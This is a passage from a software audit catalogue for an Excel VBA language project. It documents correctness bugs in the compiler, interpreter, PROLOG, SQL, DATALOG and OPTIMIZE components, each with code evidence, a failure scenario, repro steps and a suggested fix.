- Failure scenario: a program saved as ANSI (the Windows-1252 default of older Notepad, or Excel's "Text (Tab delimited)") contains `Put "£5" into cell A1.` Importing it pours `Put "�5"…` into the Instructions sheet, with no warning, and the next save persists it. U.20 built a strict decoder (`VlaUtf8Decode`) precisely to stop silent U+FFFD, but the main import path does not use it. The same applies to UTF-16 "Unicode text" files.
- Live repro: save a one-line program containing `£` as ANSI, then use Import Program File.
- Dedupe: searched for "ReadTextFile", "FFFD", "ansi fallback". The only hits are the SEC.8 note that reuses the idiom and OPTIMIZE's WTF-8 key note.
- Fix direction: read the bytes and try `VlaUtf8Decode`. On failure, fall back to `StrConv(vbUnicode)` and say so, or refuse in words naming the byte and line, the way Lint's "not-utf8" does.
- Ratchet-able?: a grep ratchet saying "no `ADODB.Stream` with `Charset = "utf-8"` for reading outside a reviewed list" is feasible.

### C33 — `delete-sheet` under Try leaves `DisplayAlerts = False` for the rest of the run

*medium · confirmed in code, live effect needs repro · Reader and emitter, slice finding 9*

- Class: 2 (host state) / **Severity: medium** (a later SaveAs overwrites silently) / Verdict: CONFIRMED in the golden. PLAUSIBLE for the overwrite.
- Where: `scripts/polyglotta/english.vla:3708-3714` (`delete-sheet`). Emitted at golden:2036-2044 (inside a Try), 2437, 2838, 3431.
- Evidence (golden):
```vba
    On Error GoTo vla_tryf_4
    application.displayalerts = False
    Call worksheets("gstruct").delete     ' fails if GStruct is absent -> jumps to vla_tryf_4
    application.displayalerts = True      ' skipped
```
- Failure scenario: `Try: Delete sheet Old.` on a workbook without "Old", followed later by `Save this workbook as backup-path.`. The SaveAs overwrites an existing file with no "replace?" prompt, and any other alert is also suppressed for the remainder of the macro. Excel only resets DisplayAlerts when the whole VBA call ends. The prelude already has the correct shape (`with-no-alerts`, prelude.vla:425-434, restoring on both exits), so the two copies of the idea have drifted.
- Live repro: the two sentences above, with `backup-path` pointing at an existing file.
- Dedupe: grepped "delete-sheet", "DisplayAlerts". Only SEC.13/SOP.1 (Word's DisplayAlerts) came up.
- Fix direction: make `delete-sheet` a `VLA_Runtime` helper that saves, sets and restores `DisplayAlerts` in its own procedure. Or expand it through `with-no-alerts` (which needs a label per use).
- Ratchet-able?: yes. Scan phrasebooks for `(set! application.X false)` inside a macro whose template does not also restore X on an error label.

### C34 — SymName, FormulaQuote and QuoteDatum classify numbers with `IsNumeric`, so `1,000` becomes two arguments (extends EN.4)

*medium · confirmed by reading · Reader and emitter, slice finding 10*

**Roadmap link:** Extends EN.4.

**Related:** C20, C5

- Class: 5/6 / **Severity: medium** / Verdict: CONFIRMED by reading.
- Where: `src/VLA.bas:5713` (`SymName`), `5308` (`FormulaQuote`), `5358` (`QuoteDatum`). The interpreter's twins are at `src/VLA_Interpreter.bas:1652-1653, 1920-1921` (`IsNumeric` + `CDbl`).
- Evidence:
```vba
Private Function SymName(ByVal s As String) As String
    If IsNumeric(s) Then
        SymName = s      ' copied verbatim into VBA source
```
- Failure scenario (en-US, no locale change needed): the reader keeps `1,000` as one atom, because the tokenizer only splits on space, parens, `;` and `"`. `IsNumeric("1,000")` is True, so `(f 1,000)` emits `f(1,000)`, which VBA reads as **two** arguments. The interpreter's `CDbl("1,000")` is 1000. In a quote, `(quote (1,000 2))` emits `Array(1,000, 2)`, three elements, and deflambda's `{1,000,2}` likewise. `$5` → `IsNumeric` True → emitted `$5` → syntax error. On a de-DE machine, `IsNumeric("1.5")` is True and the interpreter's `CDbl("1.5")` = 15 while compiled VBA sees `1.5`. INTRINSICS #2 names this exact rule, and `IsNumericLiteralText` (VLA.bas:3791) already exists.
- Dedupe: EN.4 ("separators in the reader", BETA_REARVIEW:5775) is an open placeholder with no site list, and BETA_REARVIEW:11748-11843 notes `FormulaQuote`'s `IsNumeric` in passing. This entry adds the arity-shift failure and the five exact sites. It is a **ratchet blind spot**: no `tools/check_*.ps1` enforces INTRINSICS #2.
- Fix direction: route all five sites through `IsNumericLiteralText`, and `Val` where a number is needed.
- Ratchet-able?: yes. A grep ratchet with a ceiling on `IsNumeric(`/`CDbl(` in VLA.bas and VLA_Interpreter.bas (current count 3 + 2 on atom text).

### C35 — The interpreter's error model differs from VBA's in three ways, which breaks every prelude error idiom (try-else, with-fast-excel, with-screen-off, with-no-alerts, with-protected-sheet, with-error-handler)

*medium · confirmed by reading · Interpreter and runtime, slice finding 7*

**Related:** C27

- Class: 1/10 / Severity: **medium** (a refusal that hides the real error, a spurious failure, or a hang) / Verdict: **CONFIRMED** (by reading)
- Where: `src/VLA_Interpreter.bas:817-837` (`ExecOnError` does not clear `mCaughtErr*`); `2233-2246` plus `2340-2370` (heads `err.clear`/`err.raise` resolve to nothing, because `ResolveGlobalReceiver` deliberately has no "err" case); `1567-1601` plus `1503-1523` (after a trapped jump, `mErrMode` stays "goto"). Prelude: `scripts/prelude.vla:176-182` and `327-338`, and the with-* macros in the region around line 400.
- Evidence:
```vba
        Case "goto"
            ...
                mErrMode = "goto"          ' mCaughtErrNum/Src/Desc untouched: VBA's "arming clears Err" not modelled
```
- Failure scenario:
  - (a) `(try-else v (/ 1 0) 0)`. The failing set is swallowed, then `(if (<> err.number 0) (then (err.clear) ...))` evaluates the head `err.clear`, which raises `interp-head-unresolved` ("'err.clear' is not a form ..."). That is its own diagnostic, so it escapes. try-else never falls back under the interpreter, while compiled works.
  - (b) Inside `with-fast-excel`, a failing body jumps to the label, the settings are restored, and then `(err.raise ...)` raises the same "'err.raise' is not a form" refusal. The user sees that instead of the real error.
  - (c) Stale shadow: english.vla:3819's show-all-rows swallows ShowAllData's 1004 under resume-next and never resumes, so `err.number` stays 1004. A later with-* bracket whose body succeeds then takes the re-raise branch and fails spuriously.
  - (d) After a trapped jump the handler is still armed, so an error in the recovery code jumps back to the same label: `with-protected-sheet` whose body deleted `ws`, or `with-error-handler` whose handler fails, loops forever with no Esc (IN.14). VBA would propagate the error to the caller.
- Live repro: CLI `(sub main () (try-else v (/ 1 0) 7) (debug-print v))`. Compiled prints 7. Predicted interpreter result: "'err.clear' is not a form...".
- Dedupe: IN3.6's notes name only the non-nested Try shape as supported. None of these three behaviours is filed. The prelude's error idioms are pinned only on the compile side (`VLA_Tests.bas:646-661`, `VLA_Tests_Grammar.bas:3304-3333`).
- Fix direction: Clear `mCaughtErr*` in `ExecOnError`. Add an "in handler" flag that a trapped jump sets and `resume`/`on-error` clears; while it is set, errors propagate instead of re-jumping. Resolve `err.clear`, `err.raise` and `err.number` as interpreter intrinsics.
- Ratchet-able?: Yes. Require every prelude `defmacro` with an `on-error` in its body to have an interpreter-side pin (run it through `VlaInterpret`, not only `AssertVla`).

### C36 — The interpreter forces `+`/`-` through `CDbl`; the compiled backend emits VBA's native operators

*medium · confirmed by reading · Interpreter and runtime, slice finding 9*

- Class: 5/10 / Severity: **medium** (dates come out as serial numbers; results differ between backends) / Verdict: interpreter **CONFIRMED**; compiled by VBA semantics
- Where: `src/VLA_Interpreter.bas:4102-4114` (`EvalChain`), `1776` (unary minus). Compiled: `src/VLA.bas:5026-5034` → `EmitChain` (`(a + b)`).
- Evidence:
```vba
Private Function EvalChain(lst As Collection, frame As Object, ByVal op As String) As Double
    acc = CDbl(EvalExpr(Nth(lst, 2), frame))
```
- Failure scenario: `Set due to cell A1 plus 30. Put due into cell B1.` with A1 a date. Compiled: Date + 30 is a Date, so B1 shows a date. Interpreted: the Double 45687, so B1 shows a serial number unless it is already date-formatted. For untyped values holding strings, `(+ x y)` concatenates in VBA ("1"+"2"="12") but sums in the interpreter. Null raises in the interpreter; VBA propagates it. The module's own comment at 4124-4129 says forcing CDbl "would silently narrow what this backend accepts", but `+`/`-` were left forced.
- Live repro: The date program above, under both backends.
- Dedupe: Not filed. `EvalOpChain`'s IN2.7 note explains the rule for the other operators.
- Fix direction: Move `+`/`-` (binary and unary) into `EvalOpChain` using the native VBA operators.
- Ratchet-able?: Yes. A parity test table covering operator × operand type (Date, String, Empty, Null) across both backends.

### C37 — The interpreter's `for` loop does not match VBA's For/Next: the counter's final value and writes to the counter inside the body both differ

*medium · confirmed by reading · Interpreter and runtime, slice finding 10*

- Class: 10 / Severity: **medium** (can overwrite data: the classic "next free row" idiom) / Verdict: **CONFIRMED**
- Where: `src/VLA_Interpreter.bas:1129-1151`, compared with `src/VLA.bas` `EmitFor` (`For v = a To b ... Next v`).
- Evidence:
```vba
    Do While (stepN > 0 And i <= endN) Or (stepN < 0 And i >= endN)
        VLA_Runtime.VlaDictSet frame, v, i       ' counter lives in a local; frame copy is overwritten each pass
        ExecBody lst, 3, frame
        ...
        i = i + stepN
```
- Failure scenario: `Count r from 2 to last-row: ...` followed by `Put "Total" into column A row r.` Compiled: after Next, r = last-row+1, so the total lands in the free row. Interpreted: r = last-row, so the total **overwrites the last data row**. A zero-iteration loop leaves r at its old value instead of the start value. A body that does `(set! r (+ r 1))` skips rows when compiled and has no effect when interpreted.
- Live repro: `Count k from 1 to 3, log k.` then `Log k.` Compiled logs 4. Predicted interpreter output: 3.
- Dedupe: Not filed.
- Fix direction: Keep the counter in the frame: read it back after each body, increment the frame value, and leave it at `end+step` on exit, as VBA does.
- Ratchet-able?: Yes. A parity pin that reads the counter after the loop and mutates it inside the body.

### C38 — A write that succeeded can still end the Run with a raw "Type mismatch", because the log line calls `CStr` on arrays and multi-cell ranges

*medium · confirmed by reading · Interpreter and runtime, slice finding 11*

- Class: 1 / Severity: **medium** (a raw error after the side effect; a correct program fails under Interpret) / Verdict: **CONFIRMED**
- Where: `src/VLA_Interpreter.bas:3273` (`CStr(guardedVal) <> CStr(v)`), `971`, `1070`, `1078` and `1096` (`LogEffect ... & CStr(v)`).
- Evidence:
```vba
                obj.Value = guardedVal
                If CStr(guardedVal) <> CStr(v) Then          ' v is an array -> error 13, after the write
```
- Failure scenario: `(set! (range "a1:c1") (array 1 2 3))` writes the cells and then raises error 13, "Type mismatch". This is not a catalogue message and names no sentence. Under a Try it jumps to recovery even though the write happened. `(set! (range "b1:b3") (range "a1:a3"))` fails the same way at 1096 (CStr of a Range whose default member is a 2-D array). JoinArgs/JoinKwArgs had exactly this bug fixed (IN.11); these five call sites were missed.
- Live repro: CLI `(set! (range "a1:c1") (array 1 2 3))`.
- Dedupe: IN.11 fixed the same class in JoinArgs/JoinKwArgs only. These sites are not filed.
- Fix direction: Add one `LogText(v)` helper (TypeName for objects, "(array)" for arrays, safe handling of Null and Error values) and use it at every LogEffect site and at the SEC.4 comparison.
- Ratchet-able?: Yes. Flag `CStr(` applied to a Variant inside any `LogEffect` argument in VLA_Interpreter.bas.

### C39 — Runtime helpers that fail with an Excel error, not `Err.Raise`, still go through `Application.Run`; "Work on sheet" with a bad name leaves an orphan sheet on every Run

*medium · confirmed in code, live effect needs repro · Interpreter and runtime, slice finding 12*

- Class: 1/9 plus a ratchet blind spot / Severity: **medium** / Verdict: orphan sheet **CONFIRMED**; the Application.Run break-through for native errors is **PLAUSIBLE** (IN.15 proved it for `Err.Raise` only)
- Where: `src/VLA_Runtime.bas:1028-1038` (`VlaEnsureSheet`: Add, then Name, with no `VlaCheckSheetName`); `src/VLA_IDE.bas:2974-2985` (`GetOrCreateSheet`, the same shape, run before the snapshot); `src/VLA_Interpreter.bas:2762-2779` (the generic `Application.Run` tier). `tools/check_runtime_raise_dispatch.ps1` counts a line as a raise only if it contains `RaiseRuntimeMsg|RaiseMsg|Err.Raise`.
- Evidence:
```vba
        Set ws = ActiveWorkbook.Worksheets.Add(After:=...)
        ws.Name = name                     ' 1004 on "Q1/Q2", a 32-char name, "History"...
```
- Failure scenario: `Work on sheet "Q1/Q2".` passes Check. At Run, `GetOrCreateSheet` adds `Sheet7`, and then the rename raises Excel's 1004. That happens before the snapshot, so Undo does not cover it, and each retry leaves another SheetN (the IN.12 class that was fixed only for add-sheet-called). Under the interpreter, `vlaensuresheet` has no native Case, so any 1004 inside it (for example on a protected workbook structure) is expected to break into the VBE like the pre-IN.15 raises. Other helpers with the same exposure and no native Case: `VlaItem`/`VlaFirst`/`VlaLast` (index out of range; `item 5 of` a 3-item list), `VlaMoveColumn` (bad letter), `VlaPivotCreate` (duplicate name), `VlaDeleteBlankRows` (a delete across a table), `VlaDictKeys`.
- Live repro: Under Interpret and under Compile, `Work on sheet "Q1/Q2". Put 1 into cell A1.`. Count the sheets before and after. Then `Set x to item 5 of found-items.` with a 3-item list under Interpret.
- Dedupe: IN.12 covers add-sheet-called only. IN.15's ratchet header limits itself to lexical raises. This extends IN.15.
- Fix direction: Call `VlaCheckSheetName` before `Worksheets.Add` in both functions. Either widen the ratchet's "can raise" test to any helper that touches the object model (or simply give every public `Vla*` helper a native Case and retire the generic tier), or wrap the generic `Application.Run` tier's helpers in their own handler that converts errors into a catalogue refusal.
- Ratchet-able?: Yes. The blind spot is the definition of a raise site; "calls a member on a Range/Worksheet/Workbook/Collection" is also statically detectable.

### C40 — `not` enumerates every proof of its goal instead of stopping at the first one

*medium · confirmed by reading · PROLOG, slice finding 2*

- Class: correctness and performance (budget interaction) / Severity: **medium** / Verdict: **CONFIRMED**
- Where: `src/VLA_Prolog.bas:4934-4941` (`SolveNegation`), `:4908-4926` (`SolveIsolated`)
- Evidence:
```vba
Dim noFreeVars As New Collection
SolveNegation = (SolveIsolated(goal, clauseDict, envN, envT, noFreeVars, stepsTaken).Count > 0)
```
- Failure scenario: `SolveIsolated` runs the negated goal until it is exhausted and stores an empty tuple for every proof. The header says it runs "just to check whether at least one solution exists". Standard `\+` stops at the first proof. This causes three observable differences:
  - (a) A negated goal with an unbounded proof space is refused instead of failing. With `(fact (nat 0)) (rule (nat N) (nat M) (is N (+ M 1)))`, the query `(query (not (nat X)))` hits `prolog-depth-ceiling`. SWI answers false immediately.
  - (b) A later proof that raises aborts the whole query. Take `(rule (has-senior D) (staff (dept D) (level L)) (> L 5))` against a Staff Table whose first eng row has level 7 and whose second eng row has a blank level. `(not (has-senior eng))` should fail after the first row. Instead it reaches the blank cell and refuses the entire formula with `prolog-arith-not-numeric`.
  - (c) The work budget is charged for every proof. So `(not (reports-to X boss))` over a large closure can trip `prolog-work-ceiling` where the question only needed one proof.
- Live repro: the `nat` program above, `=PROLOG("(fact (nat 0)) (rule (nat N) (nat M) (is N (+ M 1))) (query (not (nat X)))")`. Expected FALSE; it returns the depth refusal.
- Dedupe: I grepped "first proof", "exhaust", "SolveNegation" and "short-circuit" in the roadmaps. Not filed.
- Fix direction: stop the isolated search after the first solution. Reusing the existing cut machinery works: append `"!#" & <fresh barrier>` after the goal inside `SolveNegation`, exactly as `SolveIfThenElse` splices its commit. No loop owns that barrier, so the signal unwinds the whole isolated search and is dropped with the sub-call's local flag. `findall` must keep full enumeration.
- Ratchet-able?: no. It needs a regression test for each of (a) and (b).

### C41 — Numbers pass through 15-significant-digit, E-notation text between goals, which loses precision and creates numbers the engine cannot read back

*medium · confirmed in code, live effect needs repro · PROLOG, slice finding 4*

**Related:** C8, C9

- Class: numeric (5) / Severity: **medium** / Verdict: **CONFIRMED** by reading; the exact `Str$` digits need a live check (PLAUSIBLE)
- Where: `src/VLA_Relation.bas:1330-1339` (`InvariantNumberText` = `Trim$(Str$(v))`), called from `VLA_Prolog.bas:2964` `NumberToTerm` and therefore from `is`, `TableCellToTerm`, `length`, `sum-list` and `between`. `IsInvariantNumericString` (`VLA_Relation.bas:1288`) rejects anything containing `E`.
- Evidence:
```vba
s = Trim$(Str$(v))          ' 15 significant digits; E-notation at >= 1E15 and for tiny values
...
ElseIf c = "." And Not sawDot Then ... Else Exit Function   ' "1.2E+15" is not numeric
```
- Failure scenario: the environment stores only text, so every intermediate number is rounded to about 15 significant digits.
  - Rounding: `(is X (/ 1 3)) (is Y (* X 3)) (=:= Y 1)` fails, because Y is 0.999999999999999. SWI succeeds. Splitting a cost into thirds and then running `sum-list` renders `0.999999999999999` in the cell.
  - Numbers the engine cannot read back: a Table column of 16-digit numeric IDs (for example 1234567890123450) becomes the leaf `1.23456789012345E+15`. `(number? Id)` is then FALSE, any comparison or `is` on it refuses with `prolog-arith-not-numeric` ("1.23456789012345E+15 is not a number"), and a literal `1234567890123450` in a query never matches.
  - Overflow: a product that overflows a Double (`(* (** 10 300) (** 10 300))`) raises VBA error 6 from `ComputeArithmetic`'s unguarded `*`. It reaches the cell as a raw `#PROLOG! Overflow`, although a catalogue id `prolog-arith-overflow` exists (and is used only for `**`).
- Live repro: `=PROLOG("(query (is X (/ 1 3)) (is Y (* X 3)) (=:= Y 1))")` returns FALSE. Separately, a Table with a numeric cell 1234567890123450 and `(query (t (id I)) (number? I))`: expected one row, got none.
- Dedupe: I grepped "scientific", "E+15", "significant", "round-trip" and "overflow" in the roadmaps and RELEASES. PROLOG.18 fixed the locale and leading-zero issues only. Not filed. The same substrate means DATALOG (`InvariantNumberText`) is affected too.
- Fix direction: make the canonical text round-trip exactly. Emit 17 significant digits when 15 do not round-trip, and write E-notation as plain digits or accept it in `IsInvariantNumericString`. Guard `+`, `-` and `*` for non-finite results, as is already done for `**`.
- Ratchet-able?: a property test that checks `InvariantVal(InvariantNumberText(v)) = v` over random doubles, and that `IsInvariantNumericString` accepts the output.

### C42 — A Table cell holding an Excel error (for example #N/A) breaks table-to-fact conversion with a raw error, or silently becomes text

*medium · plausible, needs live repro · PROLOG, slice finding 5*

- Class: robustness, SD-2 / Severity: **medium** / Verdict: **PLAUSIBLE** (the code path is certain; which of the two failure modes happens needs Excel)
- Where: `src/VLA_Relation.bas:878` (`RangeToRows`: `Len(Trim$(CStr(arr(r, c))))`), `src/VLA_Prolog.bas:7847-7853` (`TableCellToTerm`: `Chr$(34) & CStr(v)`)
- Evidence:
```vba
If Len(Trim$(CStr(arr(r, c)))) > 0 Then allBlank = False     ' RangeToRows
...
TableCellToTerm = Chr$(34) & CStr(v)                          ' anything non-numeric, errors and Booleans included
```
- Failure scenario: `Value2` returns a `vbError` Variant for a #N/A or #DIV/0! cell, and neither path checks `IsError`. This repo states elsewhere (`VLA_Relation.bas:630`, `SpillHeaderCheck`) that `CStr` "raises 13 on an error value". If so, one #N/A anywhere in a Table makes `=PROLOG(...)` (and `DATALOG`/`SQL`, which share `RangeToRows`/`RelFromRange`) return `#PROLOG! Type mismatch`, which names no row or column. If `CStr` instead yields `"Error 2042"`, the cell silently becomes that text and matches nothing. Booleans take the same `CStr` path. VBA's Boolean-to-string conversion is a known locale question (INTRINSICS class #2), so a TRUE cell may become `"True` or a localised word depending on the machine.
- Live repro: a Table Staff with `=NA()` in one Level cell, then `=PROLOG("(query (staff (name N)))", Staff)`.
- Dedupe: I grepped "#N/A", "CVErr", "error value" and "error cell" in the roadmaps. Only table-*argument* error values are handled (DATALOG.15, `TableArgResolve` "error-value"); cell-level errors are not filed. `VlaTextOp` already refuses error values by name (`VLA_Tests.bas:6368`), so the house pattern exists.
- Fix direction: in `RangeToRows`, check `IsError` per cell and raise a catalogue refusal that names the table, row and column. Map Booleans explicitly (for example to `"TRUE`/`"FALSE`) instead of `CStr`.
- Ratchet-able?: yes, roughly. Flag `CStr(` applied to an element of a `Value2`-sourced array in `VLA_Relation.bas` when no `IsError` guard precedes it.

### C43 — Negation over a variable that is bound only later ("floundering") gives a silent wrong answer

*medium · confirmed by reading · PROLOG, slice finding 7*

- Class: correctness (doctrine: a confidently wrong answer is worse than a refusal) / Severity: **medium** / Verdict: **CONFIRMED** (no check exists: `ValidateBodyItem:3119-3122` only validates shape)
- Where: `src/VLA_Prolog.bas:3119-3122`, `:4389-4398` (the `not` dispatch)
- Evidence:
```vba
ElseIf headWord = "not" Then
    If lst.Count <> 2 Then VLA_Messages.RaiseMsg "prolog-not-bad-shape"
    ValidateBodyItem lst.Item(2), ctx, predArity
```
- Failure scenario: `(query (not (leave (name W))) (staff (name W)))` is the README policy with its goals in the wrong order. At the `not`, W is free, so the goal means "is anyone on leave". If anyone is, the whole roster is empty. Standard Prolog does the same (NAF is unsound on non-ground goals), so this is not an ISO deviation. But DATALOG refuses the same shape (stratified safety), and this module's doctrine repeatedly ranks silent wrong answers below refusals.
- Live repro: the README example with the `not` moved before the `staff` conjunct returns no rows when the Leave Table is non-empty.
- Dedupe: I grepped "flounder", "unsafe", "goal order" and "negat… unbound". Not filed. The BETA_REARVIEW:18280 hit is DATALOG.
- Fix direction: add a static check per clause and per query. When a variable occurs inside a `not` goal and also in a *later* conjunct of the same clause or query, but in no earlier one, refuse by name ("bind W before the not"). Variables local to the `not` stay legal.
- Ratchet-able?: no; it is a parse-time check plus a test.

### C44 — An error value anywhere in a table's data rows produces a raw `#SQL! Type mismatch` / `#DATALOG! Type mismatch`

*medium · confirmed by reading · SQL and DATALOG, slice finding 7*

- Class: 1/5 (raw error, not catalogued, row not named; SD-2/SD-5). Severity: medium. Verdict: CONFIRMED by reading.
- Where: src/VLA_Relation.bas:842 (RelFromRange) and :878 (RangeToRows), plus TupleKey/PartialKey/GroupKeyFromPositions downstream.
- Evidence:
```vba
            If Len(Trim$(CStr(arr(r, c)))) > 0 Then allBlank = False
```
  `CStr(CVErr(xlErrNA))` raises error 13. The same module's own SpillHeaderCheck comment says so ("never CStr, which raises 13 on an error value") and guards the **header** row. Data rows are unguarded.
- Failure scenario: a Staff Table with one `#N/A` from a failed VLOOKUP turns every `=SQL(...)`, `=DATALOG(...)` or `=PROLOG(...)` over it into "#SQL! Type mismatch". The message has no id and no cell address, and it tells the user nothing about which cell is at fault. Tables with the odd #N/A are very common.
- Live repro: put `=NA()` in any data cell of a Table passed to `=SQL("SELECT * FROM t", t)`.
- Dedupe: grepped "#N/A", "error value" and "Type mismatch" in both roadmaps. Error values are handled only for the table *argument* (DATALOG.15 "error-value") and spill headers. Not filed.
- Fix direction: in the shared SourceToArray-to-rows loop, test `IsError(arr(r, c))` and raise `relation-table-cell-is-an-error` naming the cell (the table name plus the row and column offset, or `Address`), from the same RaiseTableArgRefusal family. SQLite has no error type, so refusing is correct.
- Ratchet-able: partly. Grep VLA_Relation/VLA_Sql/VLA_Datalog for `CStr(arr(` or `CStr(t(` on cell data not preceded by an `IsError` guard.

### C45 — `AND`/`OR` guards do not protect a division: `WHERE Qty <> 0 AND Total / Qty > 5` refuses, and the comment claiming this is safe is stale

*medium · confirmed by reading · SQL and DATALOG, slice finding 8*

- Class: 1/10. Severity: medium (a wrong refusal of the canonical guard idiom). Verdict: CONFIRMED by reading.
- Where: src/VLA_Sql.bas:2475-2491 (EvalBool), comment at 2476-2481.
- Evidence:
```vba
' Not short-circuit (VBA's And/Or never are) - harmless here, since
' SQL.1's own frozen subset has no side effects and no operation that
' can raise on a value it would otherwise skip (unlike, say, division -
' not part of this subset either), ...
    Case NK_AND
        EvalBool = EvalBool(NodeBinLeft(node), colMap, row) And EvalBool(NodeBinRight(node), colMap, row)
```
  SQL.2 added `/` and PROLOG.17 added MOD, SQRT and POWER, all of which raise (`sql-division-by-zero`, domain errors). The premise of the comment no longer holds.
- Failure scenario: `SELECT Name FROM t WHERE Qty <> 0 AND Total / Qty > 5` over a table with any Qty = 0 row produces "#SQL! '/' would divide by zero." SQLite returns the rows (x/0 is NULL there, and the guard short-circuits anyway). With no CASE (SQL.10) and no NULLIF (SQL.9), there is **no** way to compute a ratio over a table containing a zero divisor. `SQRT(x)` guarded by `x >= 0 AND ...` fails the same way.
- Live repro: a Table with Qty 0 and 2, Total 10 and 20, then the query above.
- Dedupe: roadmap mentions of non-short-circuit `And` concern PROLOG/test assertions (PROLOG.20, ~14074, ~14344), not SQL's EvalBool. Not filed.
- Fix direction: short-circuit explicitly (`If Not EvalBool(left) Then EvalBool = False Else EvalBool = EvalBool(right)`, and the mirror for OR), and fix the comment. HAVING and residual ON use the same EvalBool, so they are covered too.
- Ratchet-able: yes. In any evaluator module, flag `= Eval\w+\(.*\) (And|Or) Eval\w+\(` on one line.

### C46 — Expressions over aggregates in the SELECT list are refused with a message that says the opposite

*medium · confirmed by reading · SQL and DATALOG, slice finding 9*

- Class: 10 (parse-time check narrower than the evaluator). Severity: medium (wrong refusal). Verdict: CONFIRMED by reading.
- Where: src/VLA_Sql.bas:1570-1587 (ParseSimpleSelect grouping check); message VLA_Messages.bas:1175.
- Evidence:
```vba
            If NodeKind(sExpr) <> NK_AGG Then
                ... must be ColumnNodesEqual to a GROUP BY item ...
                    VLA_Messages.RaiseMsg "sql-select-item-not-grouped", "position", svi
```
  Only a **top-level** NK_AGG is accepted. The evaluator already handles aggregates nested in expressions: CollectAggregateNodes walks NK_ARITH/NK_UNARY, EvalScalar resolves NK_AGG, and HAVING `SUM(a) > 2 * COUNT(*)` works.
- Failure scenario: `SELECT Dept, ROUND(AVG(Salary), 2) AS avg_sal FROM t GROUP BY Dept`, `SELECT MAX(x) - MIN(x) AS spread FROM t` and `SELECT SUM(a) / COUNT(*) AS r FROM t` are all refused with "SELECT item #2 is neither a GROUP BY column nor wrapped in an aggregate". All three are ordinary SQLite queries, and the item plainly *is* wrapped in aggregates.
- Live repro: any of the three queries.
- Dedupe: not in SQL.4's history or SQL.8-11. Not filed.
- Fix direction: replace the NodeKind test with a walk. Every NK_COLUMN reachable from the item **outside** an NK_AGG subtree must equal a GROUP BY item. EvalScalar then needs no change, because ValidateScalarColumns against the grouped colMap already resolves NK_AGG nodes and grouped columns.
- Ratchet-able: no. Add a pin test.

### C47 — There are no quoted identifiers, so a column whose header has a space or a non-ASCII letter cannot be referenced

*medium · confirmed by reading · SQL and DATALOG, slice finding 10*

- Class: 10 (grammar gap presented as a character error). Severity: medium (wrong/unhelpful refusal on a very common Table shape). Verdict: CONFIRMED by reading.
- Where: src/VLA_Sql.bas:815-821 (IsIdentStartChar/IsIdentChar, ASCII-only); Tokenize's final `Else` at ~1004 raises `sql-unexpected-character`.
- Evidence:
```vba
    IsIdentStartChar = (c >= "a" And c <= "z") Or (c >= "A" And c <= "Z") Or c = "_"
```
- Failure scenario: an Excel Table with headers "First Name", "Unit Price" or "Größe" (Excel's default table headers often contain spaces). RangeColumnNames registers "first name" in colMap, but no query token can ever produce it. `SELECT "First Name" FROM t` gives "'"' isn't a character SQL.1 recognizes anywhere in a query." (the message also still says "SQL.1"), and `[First Name]` gives the same for `[`. SQLite accepts `"..."`, `[...]` and `` `...` ``. Only `SELECT *` reaches such columns, and then they cannot be filtered or grouped.
- Live repro: a Table with a "First Name" column, then `=SQL("SELECT ""First Name"" FROM t", t)`.
- Dedupe: grepped "quoted identifier", "double-quoted" and "column name ... space". Nothing SQL-related. LX.6 is the English identifier policy. Not filed.
- Fix direction: tokenize `"..."` (with `""` escape) and `[...]` as TK_IDENT carrying the raw text, then Fold it as usual. Allow non-ASCII letters in bare identifiers (AscW > 127). Refuse a double-quoted identifier that matches no column by the normal unknown-column id. Also update the message's stale "SQL.1".
- Ratchet-able: no.

### C48 — Two table arguments that resolve to the same name silently replace each other (DATALOG)

*medium · plausible, needs live repro · SQL and DATALOG, slice finding 11*

- Class: 9/10. Severity: medium (silent wrong relation). Verdict: PLAUSIBLE (needs a live column-scoped pair).
- Where: src/VLA_Datalog.bas:4801 (`VlaDictSet relations, nm, rel`, add-or-replace); the same in VLA_Sql.SqlRunJoin's byName (~3014).
- Evidence: TableArgResolve names a column slice by its ListObject (DATALOG.3). `Staff[Name]` and `Staff[Dept]` therefore both become `staff`, and the second argument overwrites the first. Arity is 1 for both, so no arity refusal fires.
- Failure scenario: `=DATALOG("(rule (who X) (staff X)) (query who)", Staff[Name], Staff[Dept])` spills department names. Nothing is refused, and the user's first argument is silently ignored. SQL with the same names ends in an unknown-column refusal instead, which is harmless.
- Live repro: the formula above.
- Dedupe: no "duplicate table argument" message or item exists (grepped `same-name`, `duplicate-table` and `passed twice`).
- Fix direction: in the DATALOG, SQL and PROLOG wrappers, refuse a second argument whose resolved name is already registered, with a shared `relation-table-passed-twice` id naming both argument positions.
- Ratchet-able: no.

### C49 ✔ — A search stopped by the seconds guard is memoized, which freezes a timing accident as the session's answer

*medium · confirmed in code, live effect needs repro · OPTIMIZE, slice finding 1* · *re-read by the assembling session*

- Class: 9 (global mutable state) / determinism. Severity: medium. Verdict: CONFIRMED for the code path (the memo put is unconditional); the user-visible effect is PLAUSIBLE and needs a live timing repro.
- Where: src/VLA_Optimize.bas:1124-1127 (OptimizeRun), 2641-2643 (the GUARD outcome mapped to NONE_IN_BUDGET), src/VLA_OptimizeSearch.bas:358-366 (the guard).
- Evidence:
```vba
    SetRunMode False
    Set outp = RunOnce(rulesText, relations, hMap)
    MemoPut memoKey, outp                      ' every outcome, the guard's included
    If IsSizeRefusal(outp) Then RaiseSizeRefusal outp
...
    Case VLA_OptimizeSearch.OPT_SEARCH_GUARD
        stateId = VLA_OPTIMIZE_NONE_IN_BUDGET
        words = ChoiceGuardWords(res.seconds, res.work, effortWork, effortWords)
```
  The memo header (403-421) states the invariant: "the memo may only make an answer FASTER and may never change what it is." ChoiceGuardWords itself says the guard is "the one stop that depends on the machine."
- Failure scenario: a formula whose search normally finishes in about 3-6 s is first calculated while the machine is loaded, for example on workbook open with other UDFs recalculating, antivirus running, or a laptop on battery. The 10 s guard fires. That result is memoized under the content key and the cell spills the empty "no schedule" shape. For the rest of the session, F9, Ctrl+Alt+F9, re-entering the formula and every OPTIMIZE_STATUS/OPTIMIZE_VIOLATIONS cell over the same arguments all return the memo instantly. Each still says "the search was stopped after 10.x seconds by the guard" even though no search ran. The answer only changes after the rules or Tables are edited or the VBA project is reset, and then it becomes a found schedule. So the memo does change what the answer is, which is the invariant it exists to keep. It also defeats the retry the guard's own words suggest.
- Live repro: a roster that takes about 6-8 s at `(effort thorough)` or a large effort number. Throttle the CPU (a busy-loop in another process, or power-saver mode) and enter the formula: the status shows the guard. Remove the throttle and press Ctrl+Alt+F9: the status still shows the guard and the recalc is instant. Then run `VLA_Optimize.OptimizeMemoClear` and recalc: a schedule appears.
